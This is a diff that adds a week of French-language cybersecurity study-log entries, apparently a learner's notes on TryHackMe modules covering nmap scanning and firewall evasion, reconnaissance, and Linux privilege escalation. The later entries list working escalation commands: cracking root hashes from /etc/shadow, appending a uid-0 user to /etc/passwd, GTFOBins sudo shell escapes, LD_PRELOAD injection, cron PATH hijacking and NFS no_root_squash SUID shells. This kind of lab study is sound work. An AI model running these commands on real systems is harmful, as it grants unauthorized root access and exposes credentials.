@@ -587,3 +587,300 @@ Mnemonic (FR): "Alain part servir trois nachos à des péruviens"
 ### ➡️ Next
 - Continue Root-Me challenges
 - Start PortSwigger Web Security Academy
+
+---
+
+## 2026-03-09 — Week 4 Day 1
+
+**Duration:** ~1h30
+**Mood:** 4/5
+**Focus:** TryHackMe – NMAP (types de scans & bases)
+
+### 🛠️ What I did
+- Étudié les trois types de scans principaux (TCP Connect, SYN, UDP)
+- Mémorisé la structure des 65535 ports et les ports courants
+- Pratiqué les options nmap en ligne de commande
+
+### 📚 What I learned
+
+#### Structure des ports
+- Chaque machine possède 65535 ports
+- Ports 0–1023 = well-known (protocoles réservés)
+- HTTP: 80 / HTTPS: 443 / NetBIOS: 139 / SMB: 445
+
+#### TCP Connect Scan (-sT)
+- Complète le Three-Way Handshake complet sur chaque port
+- Plus bruyant — laisse des traces dans les logs de la cible
+- Utilisé sans accès root (quand -sS n'est pas disponible)
+
+#### SYN "Half-open" Scan (-sS)
+- Scan le plus populaire — nécessite root/sudo
+- Envoie SYN → reçoit SYN+ACK → envoie RST (handshake incomplet)
+- Plus rapide et plus discret que -sT
+
+#### UDP Scan (-sU)
+- Plus lent — pas de handshake, repose sur ICMP "port unreachable" pour les ports fermés
+- Aucune réponse → port marqué open|filtered
+- RFC 9293 définit le comportement correct du protocole TCP
+
+### 🚧 Blockers
+- None
+
+### ➡️ Tomorrow
+- Types de scans avancés (NULL, FIN, Xmas) et NSE
+
+---
+
+## 2026-03-10 — Week 4 Day 2
+
+**Duration:** ~1h30
+**Mood:** 4/5
+**Focus:** TryHackMe – NMAP (scans avancés & NSE)
+
+### 🛠️ What I did
+- Étudié les scans NULL, FIN et Xmas
+- Exploré le Nmap Scripting Engine (NSE) et ses catégories de scripts
+- Pratiqué les flags d'output et de timing
+
+### 📚 What I learned
+
+#### Types de scans avancés
+- NULL (-sN) — paquet TCP sans aucun flag ; cible envoie RST si port fermé
+- FIN (-sF) — flag FIN envoyé ; cible envoie RST si port fermé
+- Xmas (-sX) — flags PSH, URG, FIN (ressemble à un sapin en Wireshark) ; RST si fermé
+- Ces trois types sont utilisés pour l'**évasion de firewall**
+- Windows peut répondre avec RST sur tous les ports — peu fiable sur Windows
+
+#### Catégories NSE
+- `safe` — aucun impact sur la cible
+- `intrusive` — peut affecter la cible
+- `vuln` — scan de vulnérabilités connues
+- `exploit` — tentative d'exploitation
+- `auth` — bypass d'authentification (ex: FTP anonyme)
+- `brute` — brute-force de credentials
+- `discovery` — interroge les services pour obtenir des infos réseau
+
+#### Flags principaux
+- `-o` — détection d'OS
+- `-sV` — détection de version des services
+- `-v` / `-vv` — verbosité (recommandé: `-vv`)
+- `-oA` — output dans les 3 formats majeurs simultanément
+- `-oN` — output normal vers fichier
+- `-oG` — output au format grep
+- `-a` — mode agressif
+- `-T<0-5>` — timing template (plus élevé = plus rapide = plus bruyant)
+- `-p <port>` / `-p-` — port spécifique ou tous les 65535
+- `--script <nom>` — exécuter un script NSE spécifique
+- `--script=vuln` — exécuter tous les scripts de la catégorie vuln
+- `--top-ports <n>` — scanner les n ports les plus courants
+
+### 🚧 Blockers
+- None
+
+### ➡️ Tomorrow
+- Évasion de firewall avec NMAP + Passive Reconnaissance
+
+---
+
+## 2026-03-11 — Week 4 Day 3
+
+**Duration:** ~1h
+**Mood:** 4/5
+**Focus:** TryHackMe – NMAP (évasion firewall) + Passive Reconnaissance
+
+### 🛠️ What I did
+- Complété la section évasion de firewall NMAP
+- Complété le module THM Passive Reconnaissance
+
+### 📚 What I learned
+
+#### NMAP — Évasion de firewall
+- `-Pn` — skip le ping de découverte (utile quand ICMP est bloqué)
+- `-f` — fragmente les paquets en morceaux plus petits pour tromper l'IDS
+- `--mtu <n>` — taille de transmission maximum personnalisée (multiple de 8)
+- `--scan-delay <n>ms` — délai entre paquets (évasion de triggers temporels)
+- `--badsum` — checksum invalide pour détecter la présence d'un firewall
+- `--data-length <n>` — ajoute des données aléatoires aux paquets
+- Protocole bloqué par `-Pn` : ICMP
+
+#### Passive vs Active Reconnaissance
+- Passive : aucun contact direct (DNS, offres d'emploi, articles de presse)
+- Active : contact direct (connexion aux serveurs, social engineering, accès physique)
+
+#### Types d'enregistrements DNS
+| Type  | Résultat             |
+|-------|----------------------|
+| A     | Adresses IPv4        |
+| AAAA  | Adresses IPv6        |
+| CNAME | Canonical Name       |
+| MX    | Serveurs de mail     |
+| SOA   | Start of Authority   |
+| TXT   | Enregistrements TXT  |
+
+#### nslookup
+- `nslookup -type=A domain` — lookup IPv4
+- `nslookup -type=MX domain 1.1.1.1` — enregistrements MX via serveur spécifique
+- `nslookup -type=TXT domain` — enregistrements TXT
+
+### 🚧 Blockers
+- None
+
+### ➡️ Tomorrow
+- Active Reconnaissance
+
+---
+
+## 2026-03-12 — Week 4 Day 4
+
+**Duration:** ~1h
+**Mood:** 4/5
+**Focus:** TryHackMe – Active Reconnaissance
+
+### 🛠️ What I did
+- Complété le module THM Active Reconnaissance
+- Pratiqué le banner grabbing avec telnet
+- Revu les options netcat et leurs cas d'usage
+
+### 📚 What I learned
+
+#### ping — détails
+- `-s` — définit la taille des données portées par la requête ICMP echo
+- Taille de l'en-tête ICMP : 8 bytes
+- Le Firewall Windows bloque ping par défaut
+
+#### Telnet pour le banner grabbing
+- Telnet ouvre une connexion TCP brute — il faut parler le protocole du service manuellement
+- Port 80 → HTTP → `GET / HTTP/1.0` + deux Entrées
+- Port 25 → SMTP → `EHLO`, `MAIL FROM:`, etc.
+- Port 110 → POP3 → `USER`, `PASS`
+- Les headers de réponse révèlent le nom et la version du service (`Server: nginx/1.6.2`)
+
+#### Netcat — options
+- `-l` — mode écoute
+- `-p` — spécifier le port
+- `-n` — numérique uniquement, pas de résolution DNS
+- `-v` — output verbeux
+- `-vv` — très verbeux
+- `-k` — continuer à écouter après déconnexion du client
+- Port < 1024 nécessite root pour écouter
+
+### 🚧 Blockers
+- None
+
+### ➡️ Tomorrow
+- Module Linux PrivEsc
+
+---
+
+## 2026-03-13 — Week 4 Day 5
+
+**Duration:** ~2h
+**Mood:** 4/5
+**Focus:** TryHackMe – Linux PrivEsc (énumération + exploitation shadow/passwd)
+
+### 🛠️ What I did
+- Démarré le module Linux Privilege Escalation
+- Pratiqué les techniques d'énumération système
+- Exploité /etc/shadow et /etc/passwd en world-writable
+
+### 📚 What I learned
+
+#### Énumération
+- `uname -a` — infos système (kernel, architecture)
+- `id && whoami` — utilisateur courant
+- `cat /etc/passwd` — liste des utilisateurs
+- `sudo -l` — droits sudo de l'utilisateur courant
+- `ps aux` — processus en cours
+- `find / -perm -u=s -type f 2>/dev/null` — fichiers SUID
+- `cat /etc/crontab` — tâches cron planifiées
+- `cat ~/.*history | less` — historique des commandes
+- `cat /etc/exports` — configuration NFS
+
+#### Cracker /etc/shadow
+- Extraire le hash: `grep "root" /etc/shadow > hash.txt`
+- Craquer: `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
+- Afficher: `john --show hash.txt`
+- John doit tourner sur **Kali**, pas sur la cible
+
+#### /etc/shadow world-writable
+- Générer un hash: `mkpasswd -m sha-512 monmotdepasse`
+- Remplacer le hash root directement dans `/etc/shadow`
+- `su root`
+
+#### /etc/passwd world-writable
+- Générer un hash: `openssl passwd monmotdepasse`
+- Ajouter: `echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd`
+- `su newroot`
+
+### 🚧 Blockers
+- None
+
+---
+
+## 2026-03-14 — Week 4 Day 6
+
+**Duration:** ~1h30
+**Mood:** 4/5
+**Focus:** TryHackMe – Linux PrivEsc (GTFOBins sudo + LD_PRELOAD)
+
+### 🛠️ What I did
+- Exploité des permissions sudo mal configurées via GTFOBins
+- Exploité LD_PRELOAD et LD_LIBRARY_PATH pour escalader les privilèges
+
+### 📚 What I learned
+
+#### Sudo — GTFOBins
+- `sudo find . -exec /bin/sh \; -quit`
+- `sudo vim -c ':!/bin/sh'`
+- `sudo awk 'BEGIN {system("/bin/sh")}'`
+- `sudo nmap --interactive` puis `!sh`
+- `sudo less /etc/passwd` puis `!/bin/sh`
+- Référence : https://gtfobins.github.io
+
+#### LD_PRELOAD
+- Si `env_keep+=LD_PRELOAD` dans sudoers → injecter une shared library avant tout `sudo`
+- `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c`
+- `sudo LD_PRELOAD=/tmp/preload.so find`
+
+#### LD_LIBRARY_PATH
+- `ldd /usr/sbin/apache2` — lister les bibliothèques utilisées par un binaire
+- Remplacer l'une d'elles par une version malveillante compilée dans /tmp
+- `sudo LD_LIBRARY_PATH=/tmp apache2`
+
+### 🚧 Blockers
+- None
+
+---
+
+## 2026-03-15 — Week 4 Day 7
+
+**Duration:** ~1h30
+**Mood:** 4/5
+**Focus:** TryHackMe – Linux PrivEsc (cron hijacking + NFS)
+
+### 🛠️ What I did
+- Exploité le PATH hijacking sur des cron jobs
+- Exploité la misconfiguration NFS no_root_squash
+
+### 📚 What I learned
+
+#### Cron Jobs — PATH Hijacking
+- `cat /etc/crontab` — vérifier si le PATH commence par un répertoire inscriptible
+- Créer un faux script avec le même nom que le binaire cron dans ce répertoire
+- Le script copie /bin/bash vers /tmp/rootbash avec le bit SUID
+- Attendre 1 minute, puis exécuter `/tmp/rootbash -p`
+- Toujours nettoyer : `rm /tmp/rootbash && exit`
+
+#### NFS — no_root_squash
+- `cat /etc/exports` — chercher les partages avec `no_root_squash`
+- Avec cette option, root sur la machine attaquante est traité comme root sur le partage NFS
+- Sur Kali (en root) : monter le partage, créer un binaire SUID avec msfvenom, `chmod +xs`
+- Sur la cible : exécuter le binaire → shell root
+
+#### Recall d'énumération
+- `cat ~/.*history | grep -i 'mysql\|pass\|ssh'` — chercher des credentials dans l'historique
+- Toujours `exit` proprement après un shell root
+- Nettoyer les fichiers temporaires après chaque exploit
+
+### 🚧 Blockers
+- None
